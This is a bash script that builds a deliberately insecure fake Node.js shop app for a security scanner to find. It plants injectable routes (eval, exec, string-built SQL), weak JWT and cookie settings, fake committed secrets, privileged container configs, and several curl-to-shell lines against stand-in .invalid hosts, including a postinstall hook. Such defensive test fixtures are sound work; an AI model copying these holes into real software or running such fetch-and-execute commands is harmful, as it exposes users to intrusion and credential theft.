#!/usr/bin/env bash
#
# Builds "demo-shop": a deliberately insecure fake Node.js app, used to show
# what node-security-check.sh finds.
#
#   bash demo/make-demo-app.sh /path/to/new/folder
#
# EVERYTHING IN THE APP IS FAKE. The "secrets" are made-up values that only
# look like real ones, and they are put together here, at build time, so that
# this repository never holds a secret-shaped string. Nothing in the app is
# run by this script, and nothing is downloaded.
#
# Do not deploy the result anywhere. It exists to be scanned.
#
set -euo pipefail

APP="${1:-}"
if [[ -z "${APP}" ]]; then
  echo "Usage: bash make-demo-app.sh /path/to/new/folder" >&2
  exit 1
fi
if [[ -e "${APP}" && -n "$(ls -A "${APP}" 2>/dev/null)" ]]; then
  echo "ERROR: ${APP} already exists and is not empty. Give a new folder." >&2
  exit 1
fi
command -v git >/dev/null 2>&1 || { echo "ERROR: git is needed to build the demo app." >&2; exit 1; }
mkdir -p "${APP}"
cd "${APP}"

# ---- fake secrets, assembled from pieces ---------------------------------
FAKE_AWS="AKIA""IOSFODNN7EXAMPLE"                        # AWS's own documentation example
FAKE_GITHUB="ghp_""DEMOdemoDEMOdemoDEMOdemoDEMOdemoDEMO"
FAKE_STRIPE="sk_live_""DEMOdemoDEMOdemoDEMOdemo"
FAKE_DB="postgres://shop:""demo-password-123@db.internal:5432/shop"
FAKE_WEBHOOK="https://hooks.slack.com/""services/T00DEMO00/B00DEMO00/DEMOdemoDEMOdemoDEMOdemo"

put() { mkdir -p "$(dirname "$1")"; cat > "$1"; }
commit() { git add -A >/dev/null; git -c user.name="Demo" -c user.email="demo@example.invalid" commit -q -m "$1"; }

git init -q .

# ---- package.json and a hand-written lockfile ------------------------------
# The versions are chosen because they have well-known advisories, and one
# (@tanstack/history 1.161.9) is a known-malicious version from May 2026.
# Nothing is installed: the scanner only reads these files.
put package.json <<'EOF'
{
  "name": "demo-shop",
  "version": "1.0.0",
  "private": true,
  "description": "Deliberately insecure demo app for node-security-check. Do not deploy.",
  "main": "src/server.js",
  "scripts": {
    "start": "node src/server.js",
    "postinstall": "node scripts/setup.js",
    "bootstrap": "curl -fsSL https://get.demo.invalid/bootstrap.sh | bash"
  },
  "dependencies": {
    "@tanstack/history": "1.161.9",
    "cookie-parser": "1.4.6",
    "express": "4.17.1",
    "left-pad": "latest",
    "lodash": "4.17.15",
    "minimist": "0.0.8",
    "multer": "1.4.2",
    "vm2": "3.9.19"
  }
}
EOF
put package-lock.json <<'EOF'
{
  "name": "demo-shop",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "requires": true,
  "packages": {
    "": {
      "name": "demo-shop",
      "version": "1.0.0",
      "dependencies": {
        "@tanstack/history": "1.161.9",
        "cookie-parser": "1.4.6",
        "express": "4.17.1",
        "left-pad": "latest",
        "lodash": "4.17.15",
        "minimist": "0.0.8",
        "multer": "1.4.2",
        "vm2": "3.9.19"
      }
    },
    "node_modules/@tanstack/history": {
      "version": "1.161.9",
      "resolved": "https://registry.npmjs.org/@tanstack/history/-/history-1.161.9.tgz"
    },
    "node_modules/cookie-parser": {
      "version": "1.4.6",
      "resolved": "https://registry.npmjs.org/cookie-parser/-/cookie-parser-1.4.6.tgz"
    },
    "node_modules/express": {
      "version": "4.17.1",
      "resolved": "https://registry.npmjs.org/express/-/express-4.17.1.tgz"
    },
    "node_modules/left-pad": {
      "version": "1.3.0",
      "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz"
    },
    "node_modules/lodash": {
      "version": "4.17.15",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.15.tgz"
    },
    "node_modules/minimist": {
      "version": "0.0.8",
      "resolved": "https://registry.npmjs.org/minimist/-/minimist-0.0.8.tgz"
    },
    "node_modules/multer": {
      "version": "1.4.2",
      "resolved": "https://registry.npmjs.org/multer/-/multer-1.4.2.tgz"
    },
    "node_modules/vm2": {
      "version": "3.9.19",
      "resolved": "https://registry.npmjs.org/vm2/-/vm2-3.9.19.tgz"
    }
  }
}
EOF

# ---- the web server that actually runs (Node built-ins only) ---------------
put src/server.js <<'EOF'
'use strict';
// DEMO ONLY. A deliberately insecure web server, used to show what
// node-security-check.sh finds on a live site. Every weakness below is on
// purpose. Never run this anywhere that matters.
const http = require('http');
const fs = require('fs');
const path = require('path');

const ROOT = path.resolve(__dirname, '..');
const PORT = Number(process.env.PORT || 3000);
const HOST = process.env.HOST || '0.0.0.0';
const TYPES = { '.html': 'text/html', '.js': 'application/javascript', '.json': 'application/json', '.map': 'application/json' };

function fakeStack(message) {
  return [
    message,
    '    at Layer.handle [as handle_request] (' + ROOT + '/node_modules/express/lib/router/layer.js:95:5)',
    '    at next (' + ROOT + '/node_modules/express/lib/router/route.js:144:13)',
    '    at handler (' + ROOT + '/src/server.js:42:11)'
  ].join('\n');
}

const server = http.createServer(function (req, res) {
  // Weakness: announces its software and sets no security headers.
  res.setHeader('X-Powered-By', 'Express');
  // Weakness: trusts whichever website is asking, cookies included.
  if (req.headers.origin) {
    res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  // Weakness: a session cookie with no HttpOnly, Secure or SameSite.
  res.setHeader('Set-Cookie', 'sid=demo-session-value; Path=/');

  let pathname;
  try {
    pathname = decodeURIComponent(req.url.split('?')[0]);
  } catch (err) {
    // Weakness: error pages show stack traces.
    res.statusCode = 400;
    res.setHeader('Content-Type', 'text/html');
    res.end('<pre>' + fakeStack('URIError: Failed to decode param') + '</pre>');
    return;
  }

  // Weakness: answers the TRACE method.
  if (req.method === 'TRACE') {
    res.setHeader('Content-Type', 'message/http');
    res.end('TRACE ' + req.url + ' HTTP/1.1\r\n');
    return;
  }
  // Weakness: GraphQL introspection is on.
  if (pathname === '/graphql' && req.method === 'POST') {
    res.setHeader('Content-Type', 'application/json');
    res.end('{"data":{"__schema":{"queryType":{"name":"Query"}}}}');
    return;
  }
  // Weakness: an internal metrics page anyone can read.
  if (pathname === '/metrics') {
    res.setHeader('Content-Type', 'text/plain');
    res.end('# HELP http_requests_total Requests served.\n# TYPE http_requests_total counter\nhttp_requests_total 1027\n');
    return;
  }
  if (pathname === '/') pathname = '/public/index.html';

  // Weakness: serves ANY file in the project folder, hidden files included.
  const file = path.normalize(path.join(ROOT, pathname));
  if (file.startsWith(ROOT + path.sep) && fs.existsSync(file) && fs.statSync(file).isFile()) {
    res.setHeader('Content-Type', TYPES[path.extname(file)] || 'text/plain');
    fs.createReadStream(file).pipe(res);
    return;
  }
  res.statusCode = 404;
  res.setHeader('Content-Type', 'text/html');
  res.end('<pre>' + fakeStack('Error: Cannot ' + req.method + ' ' + pathname.replace(/[<>&]/g, '')) + '</pre>');
});

server.listen(PORT, HOST, function () {
  console.log('demo-shop (deliberately insecure) listening on ' + HOST + ':' + PORT);
});
EOF
put public/index.html <<'EOF'
<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>demo-shop</title><script src="/dist/app.js"></script></head>
<body><h1>demo-shop</h1><p>A deliberately insecure demo site for node-security-check. Nothing here is real.</p></body>
</html>
EOF

# ---- source files full of risky patterns (never run) -----------------------
put src/routes/admin.js <<'EOF'
// DEMO ONLY: each line is a mistake the scanner should point out. Never run.
const { exec } = require('child_process');
const express = require('express');
const router = express.Router();

router.post('/calc', (req, res) => { res.json({ result: eval(req.body.formula) }); });
router.get('/thumb', (req, res) => { exec(`convert ${req.query.file} -resize 200 out.png`); res.end(); });
router.get('/download', (req, res) => { res.sendFile(req.query.path); });
router.get('/go', (req, res) => { res.redirect(req.query.next); });
router.get('/preview', async (req, res) => { const r = await fetch(req.query.url); res.send(await r.text()); });
router.get('/page', (req, res) => { res.render(req.query.template); });
router.get('/search', (req, res) => { const re = new RegExp(req.query.q); res.json(items.filter((i) => re.test(i))); });
router.use((err, req, res, next) => { res.status(500).send(err.stack); });
module.exports = router;
EOF
put src/routes/users.js <<'EOF'
// DEMO ONLY: each line is a mistake the scanner should point out. Never run.
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');

async function login(req, res) {
  console.log('login attempt', req.body.password);
  const user = await User.findOne(req.body);
  const rows = await db.query("SELECT * FROM users WHERE email = '" + req.body.email + "'");
  const token = jwt.sign({ id: user.id }, "demo-jwt-secret");
  res.cookie('sid', token, { httpOnly: false });
  res.json({ token });
}
async function register(req, res) {
  const hash = await bcrypt.hash(req.body.password, 4);
  await User.create(req.body);
  const resetToken = Math.random().toString(36).slice(2);
  const fingerprint = crypto.createHash('md5').update(req.body.email).digest('hex');
  res.json({ resetToken, fingerprint, hash });
}
function verify(token) { return jwt.verify(token, key, { algorithms: ['HS256', 'none'] }); }
module.exports = { login, register, verify };
EOF
put src/app.js <<'EOF'
// DEMO ONLY: each line is a mistake the scanner should point out. Never run.
const express = require('express');
const session = require('express-session');
const cors = require('cors');
const multer = require('multer');
const https = require('https');

const app = express();
app.use(cors({ origin: '*', credentials: true }));
app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true }));
app.use(express.static(__dirname));
const upload = multer({ dest: 'uploads/' });
const agent = new https.Agent({ rejectUnauthorized: false });
const apiSecret = process.env.NEXT_PUBLIC_API_SECRET;
Object.assign(app.locals, {});
module.exports = { app, upload, agent, apiSecret };
EOF
put src/views/banner.js <<'EOF'
// DEMO ONLY. Never run.
export function showBanner(el, html) { el.innerHTML = html; }
EOF
put scripts/setup.js <<'EOF'
// DEMO ONLY: a harmless install script, so that "this project runs code on install" shows up.
console.log('demo-shop setup: nothing to do');
EOF

# ---- settings and secrets committed by mistake (all fake) -------------------
put .env <<EOF
# DEMO ONLY: fake values. A real .env must never be committed.
NODE_ENV=development
DATABASE_URL=${FAKE_DB}
STRIPE_SECRET_KEY=${FAKE_STRIPE}
SLACK_WEBHOOK=${FAKE_WEBHOOK}
NEXT_PUBLIC_API_SECRET=demo-not-a-real-secret
EOF
put config/aws.js <<EOF
// DEMO ONLY: a fake key (AWS's documentation example) hard-coded on purpose.
module.exports = { accessKeyId: '${FAKE_AWS}', region: 'eu-west-2' };
EOF
put config/database.js <<EOF
// DEMO ONLY: fake address with a password in it.
module.exports = { url: "${FAKE_DB}", adminPassword: "demo-admin-password-1" };
EOF
put backup.sql <<'EOF'
-- PostgreSQL database dump (DEMO ONLY: fake data)
CREATE TABLE users (id integer, email text);
INSERT INTO users VALUES (1, 'nobody@example.invalid');
EOF
put dist/app.js <<EOF
/* DEMO ONLY: a "build output" file with a fake server-side key bundled into it. */
var config={stripe:"${FAKE_STRIPE}"};console.log("demo-shop");
//# sourceMappingURL=app.js.map
EOF
put dist/app.js.map <<'EOF'
{"version":3,"sources":["../src/client/index.js"],"names":[],"mappings":"AAAA","file":"app.js"}
EOF
mkdir -p uploads && : > uploads/.gitkeep

# ---- Docker, Kubernetes and CI files with common mistakes -------------------
put Dockerfile <<'EOF'
# DEMO ONLY: every line here is a mistake the scanner should point out.
FROM node:latest
WORKDIR /app
COPY . .
COPY .env /app/.env
ENV API_TOKEN=demo-token
RUN curl -fsSL https://get.demo.invalid/tool.sh | bash
RUN chmod -R 777 /app
RUN npm install
EXPOSE 3000 22
CMD ["node", "src/server.js"]
EOF
put docker-compose.yml <<'EOF'
# DEMO ONLY: every service here is set up badly on purpose.
services:
  web:
    image: demo-shop
    privileged: true
    network_mode: host
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    environment:
      - DB_PASSWORD=demo-password-123
  db:
    image: postgres
    ports:
      - "5432:5432"
EOF
put k8s/deployment.yaml <<'EOF'
# DEMO ONLY: a deployment with the usual mistakes.
apiVersion: apps/v1
kind: Deployment
metadata:
  name: demo-shop
spec:
  template:
    spec:
      hostNetwork: true
      containers:
        - name: web
          image: demo-shop:latest
          securityContext:
            privileged: true
            runAsUser: 0
          env:
            - name: DB_PASSWORD
              value: demo-password-123
EOF
put .github/workflows/ci.yml <<'EOF'
# DEMO ONLY: this file is created inside the demo app, not in the real repository.
on: [pull_request_target, issues]
jobs:
  test:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
      - uses: some-org/some-action@main
      - run: echo "Issue opened: ${{ github.event.issue.title }}"
      - run: curl -fsSL https://get.demo.invalid/ci.sh | sudo bash
EOF

# ---- a finding the "team" has accepted --------------------------------------
put .nsc-ignore <<'EOF'
# Findings this (pretend) team has looked at and accepted. Each needs a reason.
CODE-WEAK-HASH    # MD5 is only used to build a cache key here, never for passwords
EOF

# ---- what "npm install" left behind (fake, hand-made, never run) ------------
# Left out of git, as node_modules always is, but on disk for the scanner.
put .gitignore <<'EOF'
node_modules
EOF
put node_modules/left-pad/package.json <<'EOF'
{ "name": "left-pad", "version": "1.3.0" }
EOF
put node_modules/handy-image-tools/package.json <<'EOF'
{
  "name": "handy-image-tools",
  "version": "2.1.0",
  "description": "DEMO ONLY: a made-up package whose install script downloads and runs something.",
  "scripts": {
    "postinstall": "curl -fsSL https://cdn.demo.invalid/setup.sh | sh"
  }
}
EOF

# ---- git history: a token committed, then "removed" -------------------------
put deploy.sh <<EOF
#!/bin/sh
# DEMO ONLY: fake token committed by mistake.
export GITHUB_TOKEN=${FAKE_GITHUB}
echo "deploying demo-shop"
EOF
commit "Initial demo-shop"
put deploy.sh <<'EOF'
#!/bin/sh
# The token now comes from the environment. (It is still in the git history.)
echo "deploying demo-shop with ${GITHUB_TOKEN:?set GITHUB_TOKEN}"
EOF
commit "Read the deploy token from the environment"

echo "Demo app built in ${APP}"
echo "It is deliberately insecure and entirely fake. Do not deploy it."
